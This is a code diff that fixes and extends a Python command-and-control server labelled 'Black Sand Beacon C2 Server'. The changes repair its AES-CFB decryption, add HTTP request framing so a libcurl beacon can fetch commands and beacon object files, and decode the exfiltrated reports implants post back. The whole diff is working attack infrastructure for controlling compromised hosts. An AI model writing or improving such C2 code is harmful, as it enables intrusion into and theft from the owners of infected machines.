@@ -29,6 +29,7 @@ import time
 from concurrent.futures import ThreadPoolExecutor
 from pathlib import Path
 from typing import Optional, Dict, Any
+from urllib.parse import unquote
 
 # Add include/ to path for config loader
 ROOT = Path(__file__).resolve().parent.parent
@@ -129,7 +130,7 @@ def decrypt_data(b64_data: str, key: bytes, use_hmac: bool = False) -> Optional[
 
     iv, ciphertext = raw[:16], raw[16:]
     cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
-    decryptor = cipher.encryptor()
+    decryptor = cipher.decryptor()
     return decryptor.update(ciphertext) + decryptor.finalize()
 
 
@@ -237,7 +238,13 @@ def handle_bof(state: C2State, name: str) -> bytes:
 
 
 def handle_request(state: C2State, selector: str) -> bytes:
-    """Route request to appropriate handler."""
+    """Route request to appropriate handler.
+
+    Accepts both the HTTP/1.1 request form (the beacon uses libcurl)
+    and the bare Gopher-style selector. Payloads carried in an HTTP
+    path are percent-decoded, since base64 uses '+', '/' and '='
+    which are not all legal in a request line.
+    """
     selector = selector or ""
 
     # HTTP/1.1 request parsing
@@ -252,10 +259,10 @@ def handle_request(state: C2State, selector: str) -> bytes:
             if method == "GET" and path.startswith(state.cfg["uri"].rstrip("/") + "/"):
                 return handle_get_command(state, path)
             if method == "POST" and path.startswith(state.cfg["report_uri"].rstrip("/") + "/"):
-                payload = path[len(state.cfg["report_uri"].rstrip("/") + "/"):]
-                return handle_report(state, payload)
+                prefix = state.cfg["report_uri"].rstrip("/") + "/"
+                return handle_report(state, unquote(path[len(prefix):]))
             if method == "GET" and path.startswith("/bof/"):
-                return handle_bof(state, path[len("/bof/"):])
+                return handle_bof(state, unquote(path[len("/bof/"):]))
 
     # Gopher-style selector (legacy)
     selector = selector.strip()
@@ -269,26 +276,129 @@ def handle_request(state: C2State, selector: str) -> bytes:
     return b"iUNKNOWN_SELECTOR\terror.host\t1\r\n.\r\n"
 
 
+MAX_REQUEST = 65536
+
+
+def _is_http_line(line: bytes) -> bool:
+    """True if `line` is an HTTP request line ("GET /path HTTP/1.1")."""
+    parts = line.split(b" ")
+    return len(parts) == 3 and parts[2] in (b"HTTP/1.0", b"HTTP/1.1")
+
+
+def _is_http_request(raw: bytes) -> bool:
+    """True if the first line looks like an HTTP request line.
+
+    Checked on the *complete* request only. A single recv() on a
+    long request line can return a fragment that has not reached
+    "HTTP/1.1" yet, so the caller must read to the header terminator
+    before asking.
+    """
+    return _is_http_line(raw.split(b"\r\n", 1)[0])
+
+
+def _read_request(conn: socket.socket) -> bytes:
+    """Read one full request.
+
+    HTTP is terminated by CRLFCRLF. A legacy Gopher selector is a
+    single CRLF-terminated line with no header terminator, so a
+    first line that is already complete and is not an HTTP request
+    line ends the read too.
+    """
+    data = b""
+    while b"\r\n\r\n" not in data:
+        try:
+            chunk = conn.recv(4096)
+        except socket.timeout:
+            break
+        if not chunk:
+            break
+        data += chunk
+        if len(data) > MAX_REQUEST:
+            break
+        first_line, sep, _ = data.partition(b"\r\n")
+        if sep and not _is_http_line(first_line):
+            break
+
+    head, _, rest = data.partition(b"\r\n\r\n")
+    length = 0
+    for line in head.split(b"\r\n")[1:]:
+        name, _, value = line.partition(b":")
+        if name.strip().lower() == b"content-length":
+            try:
+                length = int(value.strip())
+            except ValueError:
+                length = 0
+            break
+    while len(rest) < length:
+        try:
+            chunk = conn.recv(4096)
+        except socket.timeout:
+            break
+        if not chunk:
+            break
+        rest += chunk
+    return data
+
+
+def _http_response(body: bytes, status: str = "200 OK") -> bytes:
+    payload = body.rstrip(b"\r\n")
+    head = (
+        f"HTTP/1.1 {status}\r\n"
+        f"Content-Type: application/octet-stream\r\n"
+        f"Content-Length: {len(payload)}\r\n"
+        f"Connection: close\r\n"
+        f"\r\n"
+    ).encode("ascii")
+    return head + payload
+
+
 def serve_client(state: C2State, conn: socket.socket, addr: tuple):
     """Handle individual client connection."""
     try:
         conn.settimeout(5)
-        data = b""
-        while True:
-            chunk = conn.recv(4096)
-            if not chunk:
-                break
-            data += chunk
-            if b"\r\n" in data or len(data) > 65536:
-                break
+        data = _read_request(conn)
 
-        if data:
+        if not data:
+            return
+
+        if _is_http_request(data):
             response = handle_request(state, data.decode("latin-1"))
-            conn.sendall(response)
+            if response.startswith(b"iUNKNOWN_SELECTOR"):
+                conn.sendall(_http_response(response, "404 Not Found"))
+            else:
+                conn.sendall(_http_response(response))
+            return
+
+        # Legacy Gopher dialect: raw payload, no framing.
+        conn.sendall(handle_request(state, data.decode("latin-1")))
     except Exception as e:
         logging.error("client handler error: %s", e)
     finally:
         conn.close()
+
+
+def serve(cfg: Dict[str, Any], state: C2State):
+    """Bind and accept loop. Blocks until interrupted."""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind((cfg["host"], int(cfg["port"])))
+    sock.listen(5)
+
+    executor = ThreadPoolExecutor(max_workers=cfg.get("max_workers", 10))
+    try:
+        while True:
+            try:
+                conn, addr = sock.accept()
+            except OSError:
+                if sock.fileno() == -1:
+                    break
+                continue
+            executor.submit(serve_client, state, conn, addr)
+    except KeyboardInterrupt:
+        print("\n[!] Shutting down C2 server")
+    finally:
+        sock.close()
+        executor.shutdown(wait=False)
 
 
 def command_injector(state: C2State):
@@ -324,17 +434,9 @@ def main():
     cfg = load_runtime_config()
     state = C2State(cfg)
 
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    sock.bind((cfg["host"], cfg["port"]))
-    sock.listen(5)
-
-    max_workers = cfg.get("max_workers", 10)
-    executor = ThreadPoolExecutor(max_workers=max_workers)
-
     print(f"[*] Black Sand Beacon C2 Server")
     print(f"[*] Listening on {cfg['host']}:{cfg['port']}")
-    print(f"[*] Thread pool: {max_workers} workers")
+    print(f"[*] Thread pool: {cfg.get('max_workers', 10)} workers")
     print(f"[*] HMAC: {'enabled' if cfg.get('hmac_enabled') else 'disabled'}")
     print(f"[*] Log dir: {cfg['log_dir']}")
     print(f"[*] Upload dir: {cfg['upload_dir']}")
@@ -347,15 +449,7 @@ def main():
     )
     injector_thread.start()
 
-    try:
-        while True:
-            conn, addr = sock.accept()
-            executor.submit(serve_client, state, conn, addr)
-    except KeyboardInterrupt:
-        print("\n[!] Shutting down C2 server")
-    finally:
-        sock.close()
-        executor.shutdown(wait=False)
+    serve(cfg, state)
 
 
 if __name__ == "__main__":
